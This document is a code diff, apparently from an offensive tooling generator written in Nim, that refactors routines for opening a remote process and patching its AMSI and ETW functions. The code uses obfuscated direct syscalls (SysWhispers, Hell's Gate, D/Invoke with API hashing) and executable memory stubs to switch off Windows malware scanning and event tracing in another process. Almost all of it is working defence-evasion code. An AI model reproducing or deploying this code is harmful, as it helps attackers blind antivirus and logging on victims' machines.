@@ -365,15 +365,19 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
             disabled = true
         return disabled
 
-when isMainModule:
+proc amsRemote(): void =
+    var cid: CLIENT_ID
+    var hProcams: HANDLE
+    var status: NTSTATUS
+    cid.UniqueProcess = remoteProcID
+    var oa: OBJECT_ATTRIBUTES
     when defined(SysWhispers):
         status = opqiwepoausdasdjl(&hProcams,PROCESS_ALL_ACCESS,&oa, &cid)
-    #[
-    
+
     when defined(GetSyscallStub):
         when defined(DInvoke):
             MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
-            
+
             MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
             let syscallStub_NtOpenP2 = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
         else:
@@ -383,7 +387,6 @@ when isMainModule:
         var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP2))
         VirtualProtect(cast[LPVOID](syscallStub_NtOpenP2), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
         success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP2))
-    ]#
     else:
         when defined(Hellsgate):
             if getSyscall(ntOpenTable):
@@ -394,12 +397,11 @@ when isMainModule:
 
         status = NtOpenProcess(
             &hProcams,
-            PROCESS_ALL_ACCESS, 
-            &oa, &cid         
+            PROCESS_ALL_ACCESS,
+            &oa, &cid
         )
     when defined(verbose):
         echo obf("[*] NtOpenProcess: "), toHex(status)
-    #var hProcams = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
     success = RemotePatchAmsi(hProcams)
     if (success == 0):
         success = remoteLoadAmsi(remoteProcID)
@@ -407,6 +409,8 @@ when isMainModule:
         success = RemotePatchAmsi(hProcams)
     when defined(verbose):
         echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"
+
+amsRemote()
 
 """
 
@@ -742,7 +746,7 @@ proc RemotePatchETW(hProcss :HANDLE): bool =
             disabled = true
         return disabled
 
-when isMainModule:
+proc etwRemote(): void =
     var cid: CLIENT_ID
     var hProcams: HANDLE
     var status: NTSTATUS
@@ -754,7 +758,7 @@ when isMainModule:
         when defined(GetSyscallStub):
             when defined(DInvoke):
                 MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
-            
+
                 MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
                 let syscallStub_NtOpenP2 = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
             else:
@@ -764,7 +768,7 @@ when isMainModule:
             var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP2))
             VirtualProtect(cast[LPVOID](syscallStub_NtOpenP2), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
             success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP2))
-    
+
         when defined(Hellsgate):
             if getSyscall(ntOpenTable):
                 syscall = ntOpenTable.wSysCall
@@ -774,13 +778,12 @@ when isMainModule:
 
         status = NtOpenProcess(
             &hProcams,
-            PROCESS_ALL_ACCESS, 
-            &oa, &cid         
+            PROCESS_ALL_ACCESS,
+            &oa, &cid
         )
     when defined(verbose):
         echo obf("[*] NtOpenProcess: "), toHex(status)
-    
-    #var hProcams = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
+
     success = RemotePatchETW(hProcams)
     if (success == 0):
         success = remoteLoadNtdll(remoteProcID)
@@ -788,6 +791,8 @@ when isMainModule:
         success = RemotePatchETW(hProcams)
     when defined(verbose):
         echo obf("[*] ETW disabled in the remote process: ") & fmt"{bool(success)}"
+etwRemote()
+
 
 """
 
